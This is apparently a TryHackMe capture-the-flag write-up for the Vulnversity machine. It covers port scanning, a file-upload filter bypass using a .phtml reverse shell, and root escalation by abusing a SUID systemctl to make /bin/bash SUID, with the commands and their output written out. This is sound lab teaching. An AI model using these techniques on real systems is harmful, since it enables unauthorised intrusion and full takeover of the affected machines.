# Introduction

We first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx vulnversity.thm
```

# Enumeration

We do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV vulnversity.thm
```

We got this result
```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# FTP (port 21)
let's try to connect as anonymous
```bash
$ ftp vulnversity.thm
Connected to vulnversity.thm.
220 (vsFTPd 3.0.3)
Name (vulnversity.thm:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

we can't connect as anonymous, let's move

# SAMBA (port 139 / 445)
we list the share available with the smbclient command 

```bash
$ smbclient -L vulnversity.thm         
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (vulnuniversity server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            VULNUNIVERSITY
```
it seems there is nothing interesting here

# HTTP (port 3333)
we found a website here\
<img width="834" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/223df16e-eea1-4d50-b6e4-e6e7c46de9f0">

we do a feroxbuster to find all the directory possible and we found 2 interesting directories : /internal and /internal/uploads
```bash
$ feroxbuster -u http://vulnversity.thm:3333/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
<img width="1332" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/eee5c1ff-9765-43a5-a9fe-e600b800450a">

So we have a web page with a upload form, so we try to upload a shell.php but there is a protection which doesn't allow .php file
<img width="385" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/c1f23282-ef05-4952-9810-a8b55e0f320b">

let's try to change the extension to an executable file but less known like .phtml so we have shell.phtml :
<img width="512" alt="image" src="https://github.com/MaTe0r/tryhackme.com/assets/94843357/b8fd5673-af47-4438-8f5e-122132fd2cba">

Bingo ! we can now got our reverse shell with a nc listener on our attacking machine by visiting the url http://vulnversity:3333/internal/uploads/shell.phtml
```bash
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.8.72.209] from (UNKNOWN) [10.10.21.231] 60630
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:48:47 up 35 min,  0 users,  load average: 0.00, 0.08, 0.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Let's get a proper shell to investigate
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@vulnuniversity:/$ ^Z                   
zsh: suspended  nc -lvnp 6666
                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 6666

www-data@vulnuniversity:/$      
www-data@vulnuniversity:/$ export TERM=xterm
```

# User flag
We found the user flag in /home/bill/user.txt that is readable by everyone

# Root flag
If we look at the SUID binaries on the machine, we found that there is an interisting binary
```bash
-rwsr-xr-x 1 root root 1387496 Feb 28 12:15 /bin/systemctl
```

We can use it to escalate our privileges with creating a custom service and running it (https://gtfobins.github.io/gtfobins/systemctl/#suid)
```bash
www-data@vulnuniversity:/tmp$ echo "[Service]" >> privesc.service
www-data@vulnuniversity:/tmp$ echo "Type=oneshot" >> privesc.service 
www-data@vulnuniversity:/tmp$ echo "ExecStart=/bin/sh -c 'chmod u+s /bin/bash'" >> privesc.service 
www-data@vulnuniversity:/tmp$ echo "[Install]" >> privesc.service 
www-data@vulnuniversity:/tmp$ echo "WantedBy=multi-user.target" >> privesc.servic
www-data@vulnuniversity:/tmp$ systemctl link /tmp/privesc.service 
Created symlink from /etc/systemd/system/privesc.service to /tmp/privesc.service.
www-data@vulnuniversity:/tmp$ systemctl enable --now /tmp/privesc.service 
Created symlink from /etc/systemd/system/multi-user.target.wants/privesc.service to /tmp/privesc.service.
www-data@vulnuniversity:/tmp$ /bin/bash -p
bash-4.3#
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.3#
```
Finally we're root :)
